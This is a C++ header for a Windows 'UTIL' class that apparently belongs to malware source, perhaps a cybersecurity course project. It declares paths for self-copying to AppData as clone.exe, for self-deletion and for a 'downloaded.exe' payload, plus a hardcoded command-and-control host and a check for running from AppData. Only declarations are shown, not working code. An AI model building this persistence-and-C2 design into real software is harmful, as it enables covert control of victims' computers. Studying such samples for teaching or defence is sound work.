
#pragma once
#include <string>
#include <windows.h>
using namespace std;
/*
	Utility Module:
	Responsible for maintaining and building the various directory paths for self deletion and copy 
*/

class UTIL {
	string path;
	string username;
	string base = "C:\\Users\\";
	string appData = "\\AppData";
	string clone = "\\clone.exe";
	string downloadFileName = "downloaded.exe";
	string downloaded = "\\" + downloadFileName;
	LPCSTR c2host = "www.uvu-cybersecurity.com";
	char filename[MAX_PATH];
	void getModuleName();
	string currentDirectory;

public:
	char* getFileName();
	string getPath();
	string getBase();
	string getAppData();
	string getClone();
	string getDownloaded();
	string getDownloadFileName();
	string getUsername();
	string getAppDataPath();
	string getCurrentDirectory();
	LPCSTR getC2Host();
	bool isExecutingFromAppData();
};